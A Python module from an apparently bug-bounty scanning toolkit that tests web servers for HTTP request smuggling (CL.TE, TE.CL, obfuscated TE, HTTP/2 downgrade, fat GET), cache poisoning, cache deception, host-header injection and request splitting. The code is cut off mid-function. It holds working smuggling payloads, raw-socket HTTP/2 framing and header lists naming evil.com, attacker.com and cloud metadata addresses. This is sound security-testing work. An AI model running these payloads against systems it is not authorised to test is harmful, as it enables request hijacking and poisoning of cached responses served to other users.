"""
HTTP request smuggling & web cache poisoning — 2026 techniques.

Tests: CL.TE, TE.CL, TE.TE, H2.CL, H2.TE smuggling,
web cache poisoning, cache deception, header injection, host header attacks.

2026 advanced vectors:
- H2CL / H2TE raw-socket smuggling (HTTP/2 downgrade + CL/TE desync)
- Fat GET smuggling (GET with oversized Content-Length + body)
- Absolute-form HTTP/1.1 request smuggling
- Adaptive timing-based differential smuggling detection
- HTTP/2 pseudo-header smuggling (:method, :path manipulation)
- Extended cache deception paths (null bytes, encoded slashes, wildcards)
"""

from __future__ import annotations

import re
import json
import time
import hashlib
import asyncio
import struct
import socket
import ssl
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Any, Tuple
from urllib.parse import urlparse, urljoin

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class SmugglingFinding:
    """Single smuggling / cache poisoning finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    remediation: str = ""


@dataclass
class SmugglingResult:
    """Complete smuggling assessment result."""
    target: str
    findings: List[SmugglingFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


# ─── H2CL / H2TE Raw-Socket Smuggling ────────────────────────────────────────

class H2Smuggling:
    """HTTP/2 downgrade smuggling via raw TCP sockets.

    Technique: open a raw TCP/TLS connection, negotiate HTTP/2 via ALPN,
    then send HTTP/1.1-style smuggled payloads in H2 DATA frames or
    manipulate :method / :path pseudo-headers to confuse backends that
    parse H2→H1 downgrades inconsistently.
    """

    def __init__(self, host: str, port: int = 443, use_tls: bool = True, timeout: float = 10.0):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout

    @staticmethod
    def _h2_frame(frame_type: int, stream_id: int, payload: bytes, flags: int = 0x00) -> bytes:
        """Build a raw HTTP/2 frame."""
        length = len(payload)
        return struct.pack(">I", (length << 8) | frame_type) + struct.pack(">I", (flags << 24) | (stream_id & 0x7FFFFFFF)) + payload

    @staticmethod
    def _h2_settings_frame(settings: Dict[int, int] = None) -> bytes:
        """Build an HTTP/2 SETTINGS frame."""
        if settings is None:
            settings = {
                0x1: 65535,     # HEADER_TABLE_SIZE
                0x2: 0,         # ENABLE_PUSH
                0x3: 1000,      # MAX_CONCURRENT_STREAMS
                0x4: 65535,     # INITIAL_WINDOW_SIZE
            }
        payload = b""
        for key, val in settings.items():
            payload += struct.pack(">IH", key, val)
        return H2Smuggling._h2_frame(0x04, 0, payload)

    @staticmethod
    def _h2_headers_frame(stream_id: int, headers: Dict[str, str]) -> bytes:
        """Build a HEADERS frame with pseudo-headers (simplified HPACK)."""
        header_block = b""
        for name, value in headers.items():
            header_block += f"{name}: {value}\r\n".encode()
        return H2Smuggling._h2_frame(0x01, stream_id, header_block, flags=0x04)

    async def test_h2cl_downgrade(self, endpoint: str, smuggled_body: str = "GOTSMUGGLED") -> Optional[Dict[str, Any]]:
        """Send H2 request, then smuggle CL-based payload in DATA frame.

        The idea: the frontend accepts H2, but the backend re-parses as H1.
        By setting Content-Length in pseudo-headers to a small value but sending
        a larger body, the backend may process the remainder as a new request.
        """
        results = []
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port), timeout=self.timeout,
            )
            if self.use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    ctx.open_connection(reader, writer, server_hostname=self.host), timeout=self.timeout,
                )

            # Send H2 connection preface + SETTINGS
            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
            writer.write(self._h2_settings_frame())
            await writer.drain()

            # Read server SETTINGS + ACK
            try:
                await asyncio.wait_for(reader.read(4096), timeout=3.0)
            except asyncio.TimeoutError:
                pass

            # Send smuggled POST: set Content-Length to 0 but include body
            smuggled_request = (
                f"POST {endpoint} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 0\r\n"
                f"\r\n"
                f"{smuggled_body}"
            )

            # Frame: HEADERS (method=POST, path=endpoint) + DATA (the smuggled request as body)
            headers = {
                ":method": "POST",
                ":path": endpoint,
                ":scheme": "https",
                ":authority": self.host,
                "content-type": "application/octet-stream",
                "content-length": "0",
            }
            headers_frame = self._h2_headers_frame(1, headers)
            data_frame = self._h2_frame(0x00, 1, smuggled_request.encode(), flags=0x01)

            writer.write(headers_frame + data_frame)
            await writer.drain()

            # Read response
            try:
                resp_data = await asyncio.wait_for(reader.read(8196), timeout=5.0)
                results.append({"raw": resp_data[:2000], "type": "h2cl_downgrade"})
            except asyncio.TimeoutError:
                results.append({"note": "no response (may indicate smuggling accepted)"})

            writer.close()
            await writer.wait_closed()

            if any("GOTSMUGGLED" in str(r.get("raw", b"")) for r in results):
                return {"vulnerable": True, "technique": "h2cl_downgrade", "evidence": results}

        except Exception as e:
            logger.debug(f"H2CL downgrade test failed: {e}")

        return {"vulnerable": False, "technique": "h2cl_downgrade", "results": results}

    async def test_h2te_downgrade(self, endpoint: str) -> Optional[Dict[str, Any]]:
        """H2→TE smuggling: send Transfer-Encoding in H2 that backends re-interpret."""
        smuggled = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GOTSMUGGLED"
        )
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port), timeout=self.timeout,
            )
            if self.use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    ctx.open_connection(reader, writer, server_hostname=self.host), timeout=self.timeout,
                )

            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
            writer.write(self._h2_settings_frame())
            await writer.drain()
            try:
                await asyncio.wait_for(reader.read(4096), timeout=3.0)
            except asyncio.TimeoutError:
                pass

            headers = {
                ":method": "POST",
                ":path": endpoint,
                ":scheme": "https",
                ":authority": self.host,
                "transfer-encoding": "chunked",
                "content-type": "application/octet-stream",
            }
            headers_frame = self._h2_headers_frame(1, headers)
            data_frame = self._h2_frame(0x00, 1, smuggled.encode(), flags=0x01)

            writer.write(headers_frame + data_frame)
            await writer.drain()

            try:
                resp_data = await asyncio.wait_for(reader.read(8196), timeout=5.0)
                if b"GOTSMUGGLED" in resp_data:
                    return {"vulnerable": True, "technique": "h2te_downgrade", "evidence": resp_data[:1000]}
            except asyncio.TimeoutError:
                pass

            writer.close()
            await writer.wait_closed()
        except Exception as e:
            logger.debug(f"H2TE downgrade test failed: {e}")

        return {"vulnerable": False, "technique": "h2te_downgrade"}


# ─── Fat GET Smuggling ───────────────────────────────────────────────────────

class FatGetSmuggling:
    """Fat GET: sends GET with Content-Length + body.

    Some backends process GET + CL as having a body, others ignore it.
    The body becomes the next request on the connection.
    """

    def __init__(self, host: str, port: int = 443, use_tls: bool = True, timeout: float = 10.0):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout

    async def test_fat_get(self, endpoint: str, smuggled: str = "GOTSMUGGLED") -> Dict[str, Any]:
        """Send fat GET: GET with Content-Length and a body containing a smuggled request."""
        fat_get = (
            f"GET {endpoint} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 44\r\n"
            f"\r\n"
            f"GET /smuggled-test HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"\r\n"
        )
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port), timeout=self.timeout,
            )
            if self.use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    ctx.open_connection(reader, writer, server_hostname=self.host), timeout=self.timeout,
                )

            writer.write(fat_get.encode())
            await writer.drain()

            try:
                data = await asyncio.wait_for(reader.read(8196), timeout=5.0)
                if b"GOTSMUGGLED" in data or b"smuggled-test" in data:
                    return {"vulnerable": True, "technique": "fat_get", "evidence": data[:1000]}
            except asyncio.TimeoutError:
                pass

            writer.close()
            await writer.wait_closed()
        except Exception as e:
            logger.debug(f"Fat GET test failed: {e}")

        return {"vulnerable": False, "technique": "fat_get"}


# ─── Absolute-Form Smuggling ─────────────────────────────────────────────────

class AbsoluteFormSmuggling:
    """Absolute-form HTTP/1.1 request: GET http://target/path HTTP/1.1

    Some proxies treat absolute-form differently from origin-form,
    causing path confusion or bypass of access controls.
    """

    def __init__(self, host: str, port: int = 443, use_tls: bool = True):
        self.host = host
        self.port = port
        self.use_tls = use_tls

    async def test_absolute_form(self, endpoint: str) -> Dict[str, Any]:
        """Send absolute-form request."""
        absolute_req = f"GET http://{self.host}{endpoint} HTTP/1.1\r\nHost: {self.host}\r\n\r\n"
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port), timeout=10.0,
            )
            if self.use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    ctx.open_connection(reader, writer, server_hostname=self.host), timeout=10.0,
                )

            writer.write(absolute_req.encode())
            await writer.drain()

            try:
                data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
                status_line = data.split(b"\r\n")[0].decode(errors="ignore")
                return {
                    "vulnerable": "200" in status_line or "301" in status_line or "302" in status_line,
                    "technique": "absolute_form",
                    "status_line": status_line,
                    "raw": data[:500],
                }
            except asyncio.TimeoutError:
                pass

            writer.close()
            await writer.wait_closed()
        except Exception as e:
            logger.debug(f"Absolute-form test failed: {e}")

        return {"vulnerable": False, "technique": "absolute_form"}


# ─── Differential / Adaptive Timing Smuggling ────────────────────────────────

class DifferentialSmuggling:
    """Adaptive timing-based smuggling detection.

    Sends N identical smuggling payloads and measures response times.
    If timing varies significantly (coefficient of variation > threshold),
    it indicates the backend is processing smuggled requests inconsistently.
    """

    def __init__(self, client: httpx.AsyncClient, target: str):
        self.client = client
        self.target = target

    async def detect_differential(self, endpoint: str, payload: str, rounds: int = 20) -> Dict[str, Any]:
        """Measure timing differential across multiple smuggling attempts."""
        timings = []
        for _ in range(rounds):
            start = time.monotonic()
            try:
                await self.client.post(
                    f"{self.target}{endpoint}",
                    content=payload,
                    headers={"Content-Type": "application/octet-stream"},
                )
            except Exception:
                pass
            elapsed = time.monotonic() - start
            timings.append(elapsed)
            await asyncio.sleep(0.05)

        import statistics
        mean_t = statistics.mean(timings)
        stdev_t = statistics.stdev(timings) if len(timings) > 1 else 0
        cv = stdev_t / mean_t if mean_t > 0 else 0

        return {
            "endpoint": endpoint,
            "mean_time": round(mean_t, 4),
            "stdev": round(stdev_t, 4),
            "coefficient_of_variation": round(cv, 4),
            "rounds": rounds,
            "suspicious": cv > 0.5,  # High variance indicates inconsistent backend processing
            "timings": timings[:10],
        }


# ─── Main Tester ──────────────────────────────────────────────────────────────

class HTTPSmugglingTester:
    """
    HTTP request smuggling and web cache poisoning tester.

    2026 attack vectors:
    - CL.TE smuggling (Content-Length vs Transfer-Encoding mismatch)
    - TE.CL smuggling (Transfer-Encoding vs Content-Length mismatch)
    - TE.TE smuggling (Obfuscated Transfer-Encoding)
    - H2.CL smuggling (HTTP/2 Content-Length smuggling)
    - H2.TE smuggling (HTTP/2 Transfer-Encoding smuggling)
    - H2 downgrade smuggling (raw socket H2→H1 desync)
    - Fat GET smuggling (GET with body)
    - Absolute-form request smuggling
    - Web cache poisoning (X-Forwarded-Host, X-Original-URL)
    - Cache deception (path confusion, null bytes, encoded slashes)
    - Host header injection
    - Header injection (CRLF)
    - Request splitting
    - Differential timing analysis
    """

    # Common endpoints for testing
    TEST_ENDPOINTS = [
        "/",
        "/index.html",
        "/api",
        "/proxy",
        "/fetch",
        "/redirect",
        "/login",
        "/admin",
        "/debug",
        "/health",
        "/status",
        "/version",
    ]

    # Cache poisoning headers
    CACHE_HEADERS = {
        "X-Forwarded-Host": ["evil.com", "attacker.com", "127.0.0.1"],
        "X-Original-URL": ["/admin", "/internal", "/debug", "/.env"],
        "X-Rewrite-URL": ["/admin", "/internal", "/debug", "/.env"],
        "X-Forwarded-For": ["127.0.0.1", "169.254.169.254", "10.0.0.1"],
        "X-Real-IP": ["127.0.0.1", "169.254.169.254"],
        "X-Client-IP": ["127.0.0.1", "169.254.169.254"],
        "X-Original-Host": ["evil.com", "internal.com"],
        "X-Forwarded-Server": ["evil.com", "internal.com"],
        "X-Host": ["evil.com", "127.0.0.1"],
    }

    # HTTP smuggling payloads
    SMUGGLING_PAYLOADS = [
        {
            "name": "CL.TE Smuggling",
            "category": "cl_te",
            "description": "Content-Length/Transfer-Encoding mismatch",
            "payload": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 6\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "SMUGGLED"
            ),
            "severity": "critical",
        },
        {
            "name": "TE.CL Smuggling",
            "category": "te_cl",
            "description": "Transfer-Encoding/Content-Length mismatch",
            "payload": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 3\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "8\r\n"
                "SMUGGLED\r\n"
                "0\r\n"
                "\r\n"
            ),
            "severity": "critical",
        },
        {
            "name": "TE.TE Smuggling (Obfuscated)",
            "category": "te_te",
            "description": "Obfuscated Transfer-Encoding header",
            "payload": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 3\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Transfer-encoding: identity\r\n"
                "\r\n"
                "8\r\n"
                "SMUGGLED\r\n"
                "0\r\n"
                "\r\n"
            ),
            "severity": "critical",
        },
        {
            "name": "CL.TE via GET",
            "category": "cl_te",
            "description": "CL.TE smuggling via GET request",
            "payload": (
                "GET / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 0\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
            ),
            "severity": "high",
        },
        {
            "name": "Header Injection (CRLF)",
            "category": "header_injection",
            "description": "CRLF injection in headers",
            "payload": (
                "GET / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "X-Injected: true\r\n"
                "X-Injected-Header: evil\r\n"
                "\r\n"
            ),
            "severity": "high",
        },
        {
            "name": "CL.TE Obfuscated (Tab)",
            "category": "cl_te",
            "description": "CL.TE with tab-obfuscated Transfer-Encoding",
            "payload": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 6\r\n"
                "Transfer-Encoding:\tchunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "SMUGGLED"
            ),
            "severity": "critical",
        },
        {
            "name": "TE.CL Obfuscated (Space)",
            "category": "te_cl",
            "description": "TE.CL with space-padded Transfer-Encoding",
            "payload": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 3\r\n"
                "Transfer-Encoding:  chunked\r\n"
                "\r\n"
                "8\r\n"
                "SMUGGLED\r\n"
                "0\r\n"
                "\r\n"
            ),
            "severity": "critical",
        },
    ]

    # Cache deception payloads (extended 2026)
    CACHE_DECEPTION_PAYLOADS = [
        {"name": "Cache Deception (.css)", "category": "cache_deception", "path": "/index.html.css", "severity": "high"},
        {"name": "Cache Deception (.js)", "category": "cache_deception", "path": "/admin.js", "severity": "high"},
        {"name": "Cache Deception (.png)", "category": "cache_deception", "path": "/secret.png", "severity": "high"},
        {"name": "Cache Deception (Path Confusion)", "category": "cache_deception", "path": "/admin%00.css", "severity": "high"},
        {"name": "Cache Deception (Double Extension)", "category": "cache_deception", "path": "/admin.php.css", "severity": "high"},
        {"name": "Cache Deception (Encoded Slash)", "category": "cache_deception", "path": "/admin%2f..%2fsecret.css", "severity": "high"},
        {"name": "Cache Deception (Backslash)", "category": "cache_deception", "path": "/admin\\.css", "severity": "high"},
        {"name": "Cache Deception (Wildcard)", "category": "cache_deception", "path": "/admin*.css", "severity": "medium"},
        {"name": "Cache Deception (Fragment)", "category": "cache_deception", "path": "/admin.css#internal", "severity": "medium"},
        {"name": "Cache Deception (Question Mark)", "category": "cache_deception", "path": "/admin.css?internal", "severity": "medium"},
        {"name": "Cache Deception (Semicolon)", "category": "cache_deception", "path": "/admin.css;jsessionid=abc", "severity": "medium"},
    ]

    def __init__(
        self,
        target: str,
        timeout: float = 10.0,
        proxy: Optional[str] = None,
        verbose: bool = False,
        differential: bool = False,
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.proxy = proxy
        self.verbose = verbose
        self.differential = differential

        self._client = httpx.AsyncClient(
            timeout=timeout,
            follow_redirects=False,
            proxy=proxy,
            verify=False,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
        )

    async def close(self):
        await self._client.aclose()

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def test_all(self) -> SmugglingResult:
        """Run all HTTP smuggling and cache poisoning tests."""
        result = SmugglingResult(target=self.target)

        logger.info(f"[*] Starting HTTP smuggling & cache poisoning tests: {self.target}")

        host = urlparse(self.target).hostname or "localhost"
        port = urlparse(self.target).port or (443 if "https" in self.target else 80)
        use_tls = "https" in self.target

        sem = asyncio.Semaphore(15)

        async def bounded(func, *args, **kwargs):
            async with sem:
                return await func(*args, **kwargs)

        # Phase 1: Classic HTTP request smuggling
        tasks = []
        for ep in self.TEST_ENDPOINTS:
            for payload_def in self.SMUGGLING_PAYLOADS:
                tasks.append(bounded(self._test_smuggling, ep, payload_def, host))
            result.endpoints_tested += 1

        smuggle_results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in smuggle_results:
            if r and not isinstance(r, Exception):
                result.findings.append(r)

        # Phase 2: H2 downgrade smuggling (raw socket)
        h2 = H2Smuggling(host, port, use_tls, self.timeout)
        for ep in ["/", "/api", "/admin"]:
            try:
                r = await h2.test_h2cl_downgrade(ep)
                if r and r.get("vulnerable"):
                    result.findings.append(SmugglingFinding(
                        category="h2cl_downgrade", severity="critical",
                        title="H2→CL Downgrade Smuggling",
                        description=f"Endpoint {ep} vulnerable to H2 Content-Length downgrade smuggling.",
                        endpoint=ep, payload="H2 CL downgrade", evidence=str(r.get("evidence", "")),
                        remediation="Ensure consistent HTTP/2→1.1 downgrade handling. Validate Content-Length on backend.",
                    ))
                r2 = await h2.test_h2te_downgrade(ep)
                if r2 and r2.get("vulnerable"):
                    result.findings.append(SmugglingFinding(
                        category="h2te_downgrade", severity="critical",
                        title="H2→TE Downgrade Smuggling",
                        description=f"Endpoint {ep} vulnerable to H2 Transfer-Encoding downgrade smuggling.",
                        endpoint=ep, payload="H2 TE downgrade", evidence=str(r2.get("evidence", "")),
                        remediation="Strip or reject Transfer-Encoding on HTTP/2 connections.",
                    ))
            except Exception as e:
                logger.debug(f"H2 downgrade test failed for {ep}: {e}")

        # Phase 3: Fat GET smuggling
        fat = FatGetSmuggling(host, port, use_tls)
        for ep in ["/", "/api", "/proxy"]:
            try:
                r = await fat.test_fat_get(ep)
                if r and r.get("vulnerable"):
                    result.findings.append(SmugglingFinding(
                        category="fat_get", severity="critical",
                        title="Fat GET Smuggling",
                        description=f"Endpoint {ep} vulnerable to Fat GET smuggling (GET with body).",
                        endpoint=ep, payload="Fat GET with Content-Length", evidence=str(r.get("evidence", "")),
                        remediation="Reject GET requests with Content-Length > 0 on proxy.",
                    ))
            except Exception as e:
                logger.debug(f"Fat GET test failed for {ep}: {e}")

        # Phase 4: Absolute-form smuggling
        abs_form = AbsoluteFormSmuggling(host, port, use_tls)
        try:
            r = await abs_form.test_absolute_form("/")
            if r and r.get("vulnerable"):
                result.findings.append(SmugglingFinding(
                    category="absolute_form", severity="high",
                    title="Absolute-Form Request Smuggling",
                    description="Server accepts absolute-form HTTP requests, may enable path confusion.",
                    endpoint="/", payload=f"GET http://{host}/", evidence=str(r.get("status_line", "")),
                    remediation="Reject or normalize absolute-form requests at the proxy layer.",
                ))
        except Exception as e:
            logger.debug(f"Absolute-form test failed: {e}")

        # Phase 5: Differential timing analysis
        if self.differential:
            diff = DifferentialSmuggling(self._client, self.target)
            for ep in ["/", "/api", "/proxy"]:
                for p in self.SMUGGLING_PAYLOADS[:3]:
                    try:
                        r = await diff.detect_differential(ep, p["payload"].replace("{host}", host), rounds=15)
                        if r.get("suspicious"):
                            result.findings.append(SmugglingFinding(
                                category="differential_timing", severity="medium",
                                title=f"Differential Timing: {p['name']}",
                                description=f"Endpoint {ep} shows inconsistent timing (CV={r['coefficient_of_variation']:.2f}). "
                                f"Backend may be processing smuggled requests intermittently.",
                                endpoint=ep, payload=p["name"],
                                evidence=f"mean={r['mean_time']:.3f}s, stdev={r['stdev']:.3f}s, CV={r['coefficient_of_variation']:.3f}",
                                remediation="Investigate backend HTTP parsing behavior under malformed requests.",
                            ))
                    except Exception:
                        pass

        # Phase 6: Web cache poisoning
        poison_tasks = []
        for ep in self.TEST_ENDPOINTS:
            for header, values in self.CACHE_HEADERS.items():
                for value in values:
                    poison_tasks.append(bounded(self._test_cache_poisoning, ep, header, value))

        poison_results = await asyncio.gather(*poison_tasks, return_exceptions=True)
        for r in poison_results:
            if r and not isinstance(r, Exception):
                result.findings.append(r)

        # Phase 7: Cache deception (extended paths)
        deception_tasks = [bounded(self._test_cache_deception, p) for p in self.CACHE_DECEPTION_PAYLOADS]
        deception_results = await asyncio.gather(*deception_tasks, return_exceptions=True)
        for r in deception_results:
            if r and not isinstance(r, Exception):
                result.findings.append(r)

        # Phase 8: Host header attacks
        host_tasks = [bounded(self._test_host_header, ep) for ep in ["/", "/api", "/login"]]
        host_results = await asyncio.gather(*host_tasks, return_exceptions=True)
        for r in host_results:
            if r and not isinstance(r, Exception):
                result.findings.append(r)

        # Phase 9: Request splitting
        finding = await self._test_request_splitting()
        if finding:
            result.findings.append(finding)

        logger.info(f"[+] Smuggling & cache poisoning tests complete: {len(result.findings)} findings")
        return result

    def _save_results(self, result: "SmugglingResult", output_dir: str) -> str:
        """Persist smuggling results to <output_dir>/smuggling_<host>.json."""
        host = urlparse(self.target).hostname or self.target.replace("://", "_")
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        filepath = out / f"smuggling_{host}.json"
        payload = {
            "target": result.target,
            "timestamp": result.timestamp,
            "endpoints_tested": result.endpoints_tested,
            "summary": result.summary,
            "findings": [asdict(f) for f in result.findings],
        }
        filepath.write_text(json.dumps(payload, indent=2, default=str))
        logger.info(f"[+] Results saved → {filepath}")
        return str(filepath)

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_smuggling(
        self, endpoint: str, payload_def: Dict[str, Any], host: str
    ) -> Optional[SmugglingFinding]:
        """Test for HTTP request smuggling."""
        url = f"{self.target}{endpoint}"
        payload = payload_def["payload"].replace("{host}", host)

        try:
            # Send raw smuggling payload
            resp = await self._client.post(
                url,
                content=payload,
                headers={
                    "Content-Type": "application/octet-stream",
                    "Transfer-Encoding": "chunked",
                },
            )

            # Check for smuggling indicators
            body = resp.text.lower()

            # Indicator 1: "SMUGGLED" appears in response (CL.TE worked)
            if "smuggled" in body:
                return SmugglingFinding(
                    category=payload_def["category"],
                    severity=payload_def["severity"],
                    title=f"HTTP Smuggling: {payload_def['name']}",
                    description=f"Endpoint {endpoint} appears vulnerable to {payload_def['description']}. "
                    f"The smuggled content was reflected in the response.",
                    endpoint=endpoint,
                    payload=payload[:500],
                    evidence=f"Response: {resp.text[:500]}",
                    remediation="Ensure consistent HTTP parsing across all proxies. "
                    "Disable or normalize Transfer-Encoding headers.",
                )

            # Indicator 2: Different response timing
            start = time.time()
            resp2 = await self._client.post(
                url,
                content=payload,
                headers={"Content-Type": "application/octet-stream"},
            )
            elapsed = time.time() - start

            # Very slow response may indicate smuggling queue buildup
            if elapsed > 5 and resp2.status_code in (200, 502, 504):
                return SmugglingFinding(
                    category=payload_def["category"],
                    severity="medium",
                    title=f"HTTP Smuggling (Timing): {payload_def['name']}",
                    description=f"Endpoint {endpoint} showed unusual timing with smuggling payload. "
                    f"Response took {elapsed:.1f}s.",
                    endpoint=endpoint,
                    payload=payload[:500],
                    evidence=f"Response time: {elapsed:.1f}s, Status: {resp2.status_code}",
                    remediation="Investigate HTTP parsing behavior under malformed requests.",
                )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] Smuggling test failed for {endpoint}: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_cache_poisoning(
        self, endpoint: str, header: str, value: str
    ) -> Optional[SmugglingFinding]:
        """Test for web cache poisoning via header manipulation."""
        url = f"{self.target}{endpoint}"

        try:
            # Step 1: Send request with poisoned header
            resp1 = await self._client.get(
                url,
                headers={header: value},
            )

            # Check if header is reflected in response
            body1 = resp1.text.lower()
            if value.lower() in body1:
                return SmugglingFinding(
                    category="cache_poisoning",
                    severity="high",
                    title=f"Cache Poisoning: {header}: {value}",
                    description=f"Endpoint {endpoint} reflects {header} header in response body. "
                    f"If cached, this could poison the cache for other users.",
                    endpoint=endpoint,
                    payload=f"{header}: {value}",
                    evidence=f"Response contains: {value}",
                    remediation="Strip or override sensitive headers at the reverse proxy. "
                    "Implement cache key normalization.",
                )

            # Step 2: Check if response varies by header
            resp2 = await self._client.get(url)
            if resp1.headers.get("Cache-Control") and "public" in resp1.headers.get("Cache-Control", ""):
                if resp1.text != resp2.text:
                    return SmugglingFinding(
                        category="cache_poisoning",
                        severity="high",
                        title=f"Cache Poisoning (Vary): {header}",
                        description=f"Endpoint {endpoint} returns different responses with {header} header "
                        f"but uses public caching.",
                        endpoint=endpoint,
                        payload=f"{header}: {value}",
                        evidence=f"Responses differ: {len(resp1.text)} vs {len(resp2.text)} bytes",
                        remediation="Implement proper cache key generation including relevant headers.",
                    )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] Cache poisoning test failed: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_cache_deception(
        self, payload_def: Dict[str, Any]
    ) -> Optional[SmugglingFinding]:
        """Test for cache deception attacks."""
        url = f"{self.target}{payload_def['path']}"

        try:
            resp = await self._client.get(url)

            # Check if deceptive path is served with caching headers
            cache_control = resp.headers.get("Cache-Control", "")
            etag = resp.headers.get("ETag", "")
            last_modified = resp.headers.get("Last-Modified", "")

            if resp.status_code == 200 and (
                "public" in cache_control or etag or last_modified
            ):
                # Check if response contains sensitive content
                body = resp.text.lower()
                sensitive_indicators = [
                    "password", "token", "secret", "api_key",
                    "authorization", "session", "cookie",
                    "user", "admin", "private",
                ]

                has_sensitive = any(ind in body for ind in sensitive_indicators)

                return SmugglingFinding(
                    category="cache_deception",
                    severity=payload_def["severity"],
                    title=f"Cache Deception: {payload_def['name']}",
                    description=f"Path {payload_def['path']} is served with caching headers. "
                    f"{'Contains potentially sensitive content.' if has_sensitive else ''}",
                    endpoint=payload_def["path"],
                    evidence=f"Cache-Control: {cache_control}, Status: {resp.status_code}",
                    remediation="Normalize URL paths before caching. Don't cache responses "
                    "for requests with unusual extensions.",
                )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] Cache deception test failed: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_host_header(self, endpoint: str) -> Optional[SmugglingFinding]:
        """Test for Host header injection attacks."""
        url = f"{self.target}{endpoint}"

        evil_hosts = [
            "evil.com",
            "attacker.com",
            "127.0.0.1",
            "localhost",
            "internal.com",
            "admin.com",
            "null",
            "0",
        ]

        for evil_host in evil_hosts:
            try:
                resp = await self._client.get(
                    url,
                    headers={"Host": evil_host},
                )

                body = resp.text.lower()

                # Check if evil host is reflected
                if evil_host.lower() in body:
                    return SmugglingFinding(
                        category="host_header_injection",
                        severity="high",
                        title=f"Host Header Injection: {evil_host}",
                        description=f"Endpoint {endpoint} reflects the Host header value in response. "
                        f"This could enable password reset poisoning, cache poisoning, or SSRF.",
                        endpoint=endpoint,
                        payload=f"Host: {evil_host}",
                        evidence=f"Response contains: {evil_host}",
                        remediation="Validate Host header against allowlist. Don't reflect "
                        "Host header in responses.",
                    )

                # Check for password reset poisoning
                if "/login" in endpoint or "/reset" in endpoint or "/register" in endpoint:
                    if resp.status_code in (200, 302):
                        return SmugglingFinding(
                            category="host_header_injection",
                            severity="critical",
                            title=f"Password Reset Poisoning: {evil_host}",
                            description=f"Login/reset endpoint {endpoint} accepts arbitrary Host header. "
                            f"Could be used for password reset poisoning.",
                            endpoint=endpoint,
                            payload=f"Host: {evil_host}",
                            evidence=f"Status: {resp.status_code}",
                            remediation="Validate Host header against configured domains.",
                        )

            except Exception:
                pass

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_request_splitting(self) -> Optional[SmugglingFinding]:
        """Test for HTTP request splitting."""
        url = f"{self.target}/"

        try:
            # Request splitting: inject second request via headers
            payload = (
                "GET /admin HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "X-Injected: split\r\n"
                "\r\n"
                "GET /secret HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "\r\n"
            )

            host = urlparse(self.target).hostname or "localhost"
            payload = payload.replace("{host}", host)

